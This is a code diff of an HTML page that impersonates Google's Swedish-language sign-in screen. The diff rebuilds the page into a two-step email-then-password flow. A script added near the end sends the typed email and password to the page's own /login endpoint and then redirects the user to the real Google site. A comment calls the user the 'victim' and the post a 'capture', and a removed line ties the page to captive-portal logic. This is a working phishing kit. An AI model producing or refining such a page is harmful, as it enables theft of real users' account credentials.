@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f2f1;
+            background: #fff;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -19,35 +19,35 @@
         .main-container {
             width: 100%;
             max-width: 1040px;
-            background: #fff;
-            border-radius: 28px;
             display: flex;
-            padding: 40px;
-            gap: 40px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 48px;
+            gap: 48px;
         }
-        /* Left Column */
-        .left-col {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
+        .left-col { flex: 1; }
+        .right-col { flex: 1; display: flex; flex-direction: column; justify-content: center; min-height: 300px; }
+        
         .logo { margin-bottom: 24px; }
         .logo img { width: 48px; height: 48px; }
         h1 { font-size: 36px; font-weight: 400; margin-bottom: 12px; }
         .subtitle { font-size: 16px; margin-bottom: 32px; }
 
-        /* Right Column */
-        .right-col {
-            flex: 1;
+        /* Step Management */
+        #password-step { display: none; }
+        
+        .user-display {
             display: flex;
-            flex-direction: column;
-            justify-content: center;
+            align-items: center;
+            padding: 4px 8px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            width: fit-content;
+            margin-bottom: 24px;
+            font-size: 14px;
+            cursor: pointer;
         }
-        .input-group {
-            margin-bottom: 8px;
-            position: relative;
-        }
+        .user-display:hover { background: #f8f9fa; }
+
+        .input-group { margin-bottom: 8px; position: relative; }
         .input-group input {
             width: 100%;
             padding: 16px;
@@ -56,10 +56,8 @@
             border-radius: 4px;
             outline: none;
         }
-        .input-group input:focus {
-            border: 2px solid #0b57d0;
-            padding: 15px;
-        }
+        .input-group input:focus { border: 2px solid #0b57d0; padding: 15px; }
+
         .link-text {
             color: #0b57d0;
             text-decoration: none;
@@ -68,18 +66,13 @@
             display: inline-block;
             margin-top: 8px;
         }
-        .guest-info {
-            font-size: 14px;
-            color: #444746;
-            line-height: 1.5;
-            margin: 32px 0;
-        }
+
         .action-area {
             display: flex;
             justify-content: flex-end;
             align-items: center;
             gap: 24px;
-            margin-top: 10px;
+            margin-top: 40px;
         }
         .btn-next {
             background: #0b57d0;
@@ -91,64 +84,70 @@
             cursor: pointer;
             font-size: 14px;
         }
-        .btn-next:hover { background: #0842a0; }
-        
-        /* Footer Area */
+
         .page-footer {
-            max-width: 1040px;
+            position: absolute;
+            bottom: 0;
             width: 100%;
+            max-width: 1040px;
             display: flex;
             justify-content: space-between;
-            padding: 24px 10px;
+            padding: 24px;
             font-size: 12px;
             color: #444746;
         }
-        .footer-links a {
-            text-decoration: none;
-            color: #444746;
-            margin-left: 16px;
-        }
+        .footer-links a { text-decoration: none; color: #444746; margin-left: 16px; }
 
-        /* Mobile View */
         @media (max-width: 800px) {
-            .main-container { flex-direction: column; margin: 20px; padding: 24px; }
-            h1 { font-size: 24px; }
+            .main-container { flex-direction: column; padding: 24px; text-align: center; }
+            .left-col { flex: none; }
+            .user-display { margin: 0 auto 24px auto; }
+            .action-area { justify-content: space-between; }
         }
     </style>
 </head>
 <body>
 
     <div class="main-container">
-        <!-- Left Side: Branding -->
         <div class="left-col">
             <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_\"G\"_logo.svg/1200px-Google_\"G\"_logo.svg.png" alt="Google">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google">
             </div>
             <h1>Logga in</h1>
-            <p class="subtitle">Använd ditt Google-konto</p>
+            <p class="subtitle" id="main-subtitle">Använd ditt Google-konto</p>
         </div>
 
-        <!-- Right Side: Interaction -->
         <div class="right-col">
-            <form id="login-form" action="/login" method="POST">
-                <div class="input-group">
-                    <input type="text" id="email" name="email" placeholder="E-post eller telefonnummer" required>
+            <form id="login-form">
+                <!-- STEP 1: EMAIL -->
+                <div id="email-step">
+                    <div class="input-group">
+                        <input type="text" id="email" placeholder="E-post eller telefonnummer" required>
+                    </div>
+                    <a href="#" class="link-text">Har du glömt din e-postadress?</a>
+                    <div style="margin-top: 32px; font-size: 14px; color: #444746;">
+                        Är detta inte din dator? Logga in privat med gästläget. 
+                        <a href="#" class="link-text">Läs mer</a>
+                    </div>
+                    <div class="action-area">
+                        <a href="#" class="link-text">Skapa konto</a>
+                        <button type="button" class="btn-next" onclick="showPasswordStep()">Nästa</button>
+                    </div>
                 </div>
-                <a href="#" class="link-text">Har du glömt din e-postadress?</a>
 
-                <div class="guest-info">
-                    Är detta inte din dator? Logga in privat med gästläget. 
-                    <a href="#" class="link-text">Läs mer om hur du använder gästläget</a>
-                </div>
-
-                <!-- Capture Password (Combined for Captive Portal logic) -->
-                <div class="input-group" style="margin-top: -15px; margin-bottom: 20px;">
-                    <input type="password" name="password" placeholder="Lösenord" required>
-                </div>
-
-                <div class="action-area">
-                    <a href="#" class="link-text" style="margin-top:0">Skapa konto</a>
-                    <button type="submit" class="btn-next">Nästa</button>
+                <!-- STEP 2: PASSWORD -->
+                <div id="password-step">
+                    <div class="user-display" onclick="showEmailStep()">
+                        <span id="display-email"></span>
+                        <svg style="margin-left:8px" width="12" height="12" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Ange ditt lösenord" required>
+                    </div>
+                    <a href="#" class="link-text">Har du glömt lösenordet?</a>
+                    <div class="action-area">
+                        <button type="submit" class="btn-next">Nästa</button>
+                    </div>
                 </div>
             </form>
         </div>
@@ -163,5 +162,48 @@
         </div>
     </div>
 
+    <script>
+        const emailStep = document.getElementById('email-step');
+        const passwordStep = document.getElementById('password-step');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const displayEmail = document.getElementById('display-email');
+        const subtitle = document.getElementById('main-subtitle');
+
+        function showPasswordStep() {
+            if(emailInput.value.length > 3) {
+                displayEmail.innerText = emailInput.value;
+                emailStep.style.display = 'none';
+                passwordStep.style.display = 'block';
+                subtitle.innerText = 'Välkommen';
+                passwordInput.focus();
+            }
+        }
+
+        function showEmailStep() {
+            emailStep.style.display = 'block';
+            passwordStep.style.display = 'none';
+            subtitle.innerText = 'Använd ditt Google-konto';
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const data = 'email=' + encodeURIComponent(emailInput.value) + 
+                         '&password=' + encodeURIComponent(passwordInput.value);
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/login', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    // Redirect victim to actual Google after capture
+                    window.location.href = "https://accounts.google.com";
+                }
+            };
+            xhr.send(data);
+        });
+    </script>
 </body>
 </html>
